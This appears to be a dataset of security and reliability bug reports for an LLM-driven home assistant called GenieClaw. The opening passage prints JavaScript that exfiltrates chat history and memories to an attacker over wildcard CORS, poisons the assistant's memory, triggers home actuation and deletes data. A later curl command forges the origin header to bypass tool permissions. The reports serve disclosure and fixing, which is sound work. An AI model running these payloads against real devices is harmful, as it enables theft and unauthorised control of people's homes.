2. From any browser on the same machine, open an attacker-controlled page and run:
   ```js
   // exfiltrate — wildcard ACAO lets the attacker's JS READ the response
   fetch('http://127.0.0.1:3000/api/chat/history', {credentials:'omit'})
     .then(r => r.text()).then(send_to_attacker);
   fetch('http://127.0.0.1:3000/api/memories').then(r => r.json()).then(send_to_attacker);

   // drive the LLM / poison memory (simple request — Content-Type is allow-listed)
   fetch('http://127.0.0.1:3000/api/chat', {method:'POST',
     headers:{'Content-Type':'application/json'},
     body: JSON.stringify({message:'...'})});

   // actuate the home: read the confirmation token cross-origin, then confirm it
   fetch('http://127.0.0.1:3000/api/actuation/pending')
     .then(r => r.json())
     .then(p => fetch('http://127.0.0.1:3000/api/actuation/confirm', {method:'POST',
       headers:{'Content-Type':'application/json'},
       body: JSON.stringify({token: p.token})}));

   // destroy household memory
   fetch('http://127.0.0.1:3000/api/memories/delete', {method:'POST',
     headers:{'Content-Type':'application/json'}, body: JSON.stringify({id: 1})});
   ```
3. Observe the responses are readable by the attacker page (GET) and the POSTs
   take effect (CSRF). A header-less browser request carries no `X-Genie-Origin`,
   which `normalized_origin` maps `Unknown → Api`
   ([server.rs:277-283](crates/genie-core/src/server.rs#L277-L283)), and `api` is
   in the default `actuation_allowed_origins`
   ([config.rs:2310-2319](crates/genie-common/src/config.rs#L2310-L2319)) — so the
   actuation path is reachable.

### Expected behavior

The localhost API is a trust boundary. Cross-origin browser requests from
untrusted pages must not be able to read responses or invoke mutating/actuating
endpoints. Origin and Host should be validated against a strict allowlist, and
mutating endpoints should require an unguessable local token.

### Actual behavior

- Every response sets a wildcard ACAO. Main JSON writer:
  [server.rs:442-448](crates/genie-core/src/server.rs#L442-L448); streaming
  writer: [server.rs:948-953](crates/genie-core/src/server.rs#L948-L953);
  dashboard writer: [genie-api/src/http.rs:156-163](crates/genie-api/src/http.rs#L156-L163).
- `OPTIONS` is answered `200` with the same wildcard headers, so preflight always
  passes ([server.rs:435](crates/genie-core/src/server.rs#L435)).
- There is **no** `Origin` allowlist and **no** `Host`-header validation anywhere
  (grep of both crates: the only request header consulted on the h…

problems.title: [bug] tools: security principal is forgeable — per-origin ACLs, rate limits, and audit trail all trust the client-suppli
problems.issue_body:
### Summary

On the HTTP path the authorization principal (`RequestOrigin`) is taken verbatim
from the client-supplied `X-Genie-Origin` header, so any caller can claim any
origin to bypass per-origin tool/actuation ACLs, evade the rate limiter, and
forge audit-trail attribution.

### Steps to reproduce

1. Harden the device in a realistic way, e.g.
   `denied_tools_by_origin = { telegram = ["home_control"] }`, a tighter
   `allowed_origins`, or a low `max_actions_per_minute_by_origin` for `api`.
   Both gates are on by default
   ([config.rs:2292-2296](crates/genie-common/src/config.rs#L2292-L2296)).
2. Send a request that simply asserts a more permissive origin:
   ```shell
   curl -s http://127.0.0.1:3000/api/chat \
     -H 'Content-Type: application/json' \
     -H 'X-Genie-Origin: voice' \
     -d '{"message":"turn on the heater"}'
   ```
3. Observe the request is authorized as `voice` regardless of how the operator
   restricted other origins. Rotate the header value across requests to keep
   landing in fresh rate-limit buckets.


### Expected behavior

`RequestOrigin` must be *established by the server* from the transport/channel
(which socket/listener the request arrived on, or an authenticated channel
token), not asserted by the unauthenticated caller. The per-origin ACL,
rate-limit, and audit model is only sound if the origin cannot be spoofed.

### Actual behavior

The origin is read straight from the request header
([server.rs:320-323](crates/genie-core/src/server.rs#L320-L323)) via
`RequestOrigin::from_header` ([actuation.rs:24-35](crates/genie-core/src/tools/actuation.rs#L24-L35))
and then used as the principal throughout the dispatcher:
- per-origin **tool ACL** — [dispatch.rs:498-499](crates/genie-core/src/tools/dispatch.rs#L498-L499) (`tool_origin_allowed`)
- per-origin **actuation ACL** — [dispatch.rs:589](crates/genie-core/src/tools/dispatch.rs#L589) (`actuation_origin_allowed`)
- per-origin **rate-limit bucket** — [dispatch.rs:76-79](crates/genie-core/src/tools/dispatch.rs#L76-L79) + [dispatch.rs:613-617](crates/genie-core/src/tools/dispatch.rs#L613-L617) (each origin has its own bucket)
- **audit-trail provenance** — [dispatch.rs:554-562](crates/genie-core/src/tools/dispatch.rs#L554-L562)
- per-origin **actuation confidence thresholds** — [ha/policy.rs:177-179](crates/genie-core/src/ha/policy.rs#L177-L179) (Voice 0.88 / Telegram 0.90 / Api 0.84): forging the origin selects the lowest bar.

A caller can therefore (a) pick whichever origin has the most permissive
ACL/threshold to bypass tool/actuation denials, (b) evade the rate limit by
rotating the claimed origin, and (c) forge the tamper-evident audit log's origin
attribution. The trusted in-process callers set their origin directly
(voice — [voice_loop.rs:748](crates/genie-core/src/voice_loop.rs#L748); repl —
[repl.rs:73](crates/genie-core/src/repl.rs#L73)), so a free-text header is the
*only* thing distinguishing a real channel from an arbitrary localhost client.

### Hard…

problems.title: Cache stable system prompt prefix for genie-ai-runtime requests
problems.issue_body:
## Problem

GenieClaw sends the static system prompt prefix on every genie-ai-runtime chat turn, followed by dynamic household context and conversation history. The runtime already receives session and cache TTL hints, but it does not get an explicit stable prefix key/boundary that lets it distinguish the reusable system prompt prefix from per-turn memory context.

## Proposal

Add system-prompt prefix cache metadata to `nvext.cache_control` for genie-ai-runtime requests:

- derive a stable cache key from the bytes before the dynamic household context section
- include the reusable prefix byte length
- keep generic OpenAI-compatible backends unchanged
- preserve existing TTL/session hint behavior

## Acceptance criteria

- first-party chat/voice/repl requests can carry prefix cache metadata when using genie-ai-runtime
- the cache key remains stable when only household context changes
- generic backends continue omitting `nvext`
- tests cover serialization and dynamic-context boundary behavior

problems.title: [bug] governor: mode transition commits when swap_llm_model fails
problems.issue_body:
### Summary

`Governor::transition()` logs `swap_llm_model` failures but still commits the mode change:

```rust
// governor.rs ~L223-225, L233-235, L242-244
if let Err(e) = ServiceCtl::swap_llm_model(&unit, &path).await {
    tracing::error!(...);
}
// ...
self.store.insert_transition(...)?;
self.current_mode = target;
```

After #148, `swap_llm_model` correctly returns `Err` when restart fails — but the governor treats that as non-fatal. Operators see NightB in `/api/status` while the 4B model may still be loaded (OOM risk).

### Steps to reproduce

1. Run `genie-governor` with mode transitions (Day / NightB / Media).
2. Make LLM unit restart fail (mask unit, bad override path, polkit denial).
3. Trigger transition into NightB or back to Day (socket `set_mode` or scheduled transition).
4. Observe error log from `swap_llm_model`, but `current_mode` and `governor.db` transition row still advance.

### Expected behavior

Failed model swap aborts the transition (no `insert_transition`, `current_mode` unchanged) or rolls back already-stopped units; control socket returns `{"ok": false, "error": ...}`.

### Actual behavior

Transition history and in-memory mode claim success; wrong LLM weights may keep running under the new mode's RAM budget.

### GenieClaw version / commit

`main` @ `crates/genie-governor/src/governor.rs` `transition()` ~L180–264

### Additional context

**Duplicate check:** #148 fixed swap exit status; #214 covered ignored start/stop — neither covers swap errors still committing transition.

**PR scope:** Propagate swap errors from `transition()`, optional rollback, mocked systemctl unit tests — ~80–120 lines Rust + tests.

problems.title: [bug] governor: control socket accepts unbounded JSON command lines
problems.issue_body:
### Summary

The governor Unix control socket reads newline-delimited JSON with no maximum line length:

```rust
// control.rs ~L87-89
let mut lines = BufReader::new(reader).lines();
while let Ok(Some(line)) = lines.next_line().await {
```

Any local peer that can write to `/run/geniepod/governor.sock` (group `genie`, mode `0o660`) can send megabyte-sized lines. Each line is trimmed, copied to `String`, and parsed — memory/CPU pressure without triggering a valid command.

### Steps to reproduce

1. Connect to governor socket as a user in the `genie` group.
2. Write a single line of multi-MiB JSON.
3. Observe governor allocating large buffers per connection.

### Expected behavior

Reject lines over a fixed cap (e.g. 4–16 KiB), close connection on violation; optional max commands per connection.

### Actual behavior

Unbounded line reads until peer closes or OOM.

### GenieClaw version / commit

`main` @ `crates/genie-governor/src/control.rs` `handle_connection` ~L85–115

### Additional context

**Duplicate check:** #217 fixed socket permissions — not duplicate (line size / DoS).

**PR scope:** Bounded line reader, unit tests with oversized payload — ~60–100 lines .

problems.title: [bug] actuation: confirmation manager has no cap on pending confirmations
problems.issue_body:
### Summary

Gated home actions create `PendingConfirmation` entries stored in a `HashMap` until expiry (10 minutes):

```rust
// actuation.rs ~L111-129
prune_expired(&mut state.pending);
state.pending.insert(token, pending.clone());
```

There is no maximum pending count. A tool/LLM loop that repeatedly issues confirmations without executing them grows memory and slows `confirm()` (constant-time scan over all pending keys).

### Steps to reproduce

1. Run genie-core with home actuation enabled.
2. Trigger many gated actions in a loop without confirming.
3. Observe `pending` map grows until 10-minute expiry; `confirm()` latency increases.

### Expected behavior

Cap pending confirmations (e.g. 32–64), reject new issues with a clear tool error when cap reached.

### Actual behavior

Unbounded growth until time-based prune.

### GenieClaw version / commit

`main` @ `crates/genie-core/src/tools/actuation.rs` `ConfirmationManager::issue` ~L101–131

### Additional context

**Duplicate check:** #131 covers audit IO drops — not in-memory pending map exhaustion.

**PR scope:** `MAX_PENDING_CONFIRMATIONS`, cap check in `issue()`, unit tests — ~50–90 lines.

problems.title: [bug] skills: panic = "abort" in the release profile silently voids the catch_unwind fault barrier in genie-skill-sdk —
problems.issue_body:
### Summary

The workspace release profile sets `panic = "abort"` while `genie-skill-sdk`'s macro-generated fault barrier relies on `std::panic::catch_unwind`; these two settings are mutually exclusive. In every release binary, a skill panic aborts the entire `genie-core` daemon instead of being caught, counted, and triggering auto-unload — the entire skill isolation model is silently absent from shipped builds.

---

### Steps to reproduce

1. Check out `main`; confirm `Cargo.toml:42`:
   ```toml
   [profile.release]
   panic = "abort"
   ```
2. Build `genie-core` and `skills/hello-world` in release mode:
   ```sh
   cargo build --release -p genie-core
   cargo build --release -p hello-world
   ```
3. Deploy the `hello-world.so` skill. Modify its `__skill_execute` body to `panic!("deliberate")` on any input, rebuild, re-deploy (or craft a minimal reproduction skill that panics unconditionally).
4. Invoke the skill via the chat interface or API.

---

### Expected behavior

- `std::panic::catch_unwind` in the SDK macro intercepts the panic.
- `execute()` returns `(false, "skill panicked: deliberate")`.
- `LoadedSkill`'s fault counter increments (`loader.rs:251–253`).
- After 3 faults the skill is auto-unloaded (`loader.rs:267–269`).
- `genie-core` continues serving all other requests.

---

### Actual behavior

- With `panic = "abort"`, `catch_unwind` is a **no-op**; the Rust runtime never runs unwind machinery.
- The skill panic causes an immediate `SIGABRT` / process abort — identical to an uncaught panic without any fence.
- `genie-core` dies. `systemd` restarts it. The fault counter is never incremented; the skill is never auto-unloaded.
- A reviewed, Ed25519-signed skill that panics on a specific malformed input will kill the daemon on every invocation of that input in production.
- Debug builds (`panic = "unwind"` by default) behave correctly — `catch_unwind` works, CI passes, tests pass. The discrepancy is entirely invisible until the field.

---

### Hardware

Non-Jetson (x86_64 dev / cross-build host)

### JetPack / L4T version

N/A

### GenieClaw version / commit

dd9255e

### Relevant logs

```shell
# Release binary — skill panic, no catch_unwind interception:
May 28 15:11:42 genie-core[3102]: Dispatching skill: hello-world
May 28 15:11:42 genie-core[3102]: Aborted (core dumped)
May 28 15:11:42 systemd[1]: genie-core.service: Main process exited, code=dumped, status=6/ABRT
May 28 15:11:42 systemd[1]: genie-core.service: Failed with result 'core-dump'.
May 28 15:11:43 systemd[1]: genie-core.service: Scheduled restart job, restart counter is at 1.

# Debug binary — same skill, catch_unwind active:
May 28 15:11:42 genie-core[3099]: skill hello-world panicked — fault 1/3


*(Illustrative — exact messages depend on log level; the daemon abort is the definitive symptom.)*

---
```

### Additional context

**Affected files:**

| Location | Role |
|---|---|
| `Cargo.toml:42` | `[profile.release] panic = "abort"` — root cause |
| `crates/genie-…

problems.title: [bug] skills: LoadedSkill::execute() blocks the tokio LocalSet thread — no spawn_blocking, no timeout
problems.issue_body:
### Summary

`LoadedSkill::execute()` calls a C function pointer synchronously on the single `tokio::task::LocalSet` OS thread with no `spawn_blocking` offload and no timeout, so any skill that hangs (blocking I/O, tight loop, mutex wait, network call without a deadline) freezes the entire async executor and renders the device permanently unresponsive.

---

### Steps to reproduce

1. Build genie-claw on any target (reproduces on x86_64 dev host).
2. Write or deploy a skill whose `execute` body performs a blocking operation — for example a `std::thread::sleep(Duration::from_secs(60))` or a blocking TCP connect with no timeout.
3. Send any tool call that dispatches to that skill (via the chat interface, Telegram, or the API).
4. While the skill call is in flight, poll `GET /api/health` and `GET /api/dashboard`.

---

### Expected behavior

- The C skill call is offloaded via `tokio::task::spawn_blocking` so the executor thread remains free.
- A configurable deadline (e.g. `skill_execution_timeout_ms` in `SkillPolicyConfig`) cancels the blocking thread and returns a timeout error to the caller.
- `/api/health`, voice pipeline, Telegram, and all other `spawn_local` tasks continue responding normally regardless of skill duration.
- The `ChatTurnGate` deadline still fires; the `Governor` does not see a false crash.

---


### Actual behavior

- `LoadedSkill::execute()` is called synchronously on the executor thread via a raw C function pointer (`(vtable.execute)(c_args.as_ptr())`); there is no `await` point and no yield back to the runtime.
- All other `spawn_local` tasks — `/api/health`, dashboard, voice, Telegram — are completely starved for the duration of the call.
- The `ChatTurnGate` bounded deadline never fires because no tasks are polled.
- `Governor` may interpret the health probe silence as a daemon crash and restart `genie-core`, which reschedules the same skill call, looping indefinitely.
- A signed, fully reviewed skill that develops a hang on one input class can render the device permanently unresponsive without any log evidence of why.

---

### Hardware

Non-Jetson (x86_64 dev / cross-build host)

### JetPack / L4T version

N/A

### GenieClaw version / commit

dd9255e

### Relevant logs

```shell
# Governor restart loop caused by health-probe silence during a hung skill call:
May 28 14:03:11 genie-core[2841]: [WARN] ChatTurnGate: lock held >30 s — forcing release
May 28 14:03:12 genie-core[2841]: [ERROR] health probe timeout after 5000 ms
May 28 14:03:13 systemd[1]: genie-core.service: Main process exited, code=killed
May 28 14:03:13 systemd[1]: genie-core.service: Failed with result 'signal'.
May 28 14:03:14 systemd[1]: genie-core.service: Scheduled restart job, restart counter is at 1.


*(Illustrative — the actual symptom is `/api/health` returning nothing while the skill is running.)*

---
```

### Additional context

**Affected code paths** (all require async signature changes as part of the fix):

| Location | Issue |
|---|---|
|…

problems.title: [bug] tools/timer: unbounded active timers and unchecked duration overflow
problems.issue_body:
### Summary

\TimerManager::set\ appends to an unbounded \Vec\ with no cap. Repeated \set_timer\ tool calls can grow memory without limit. \seconds * 1000\ also uses unchecked arithmetic.

### Expected
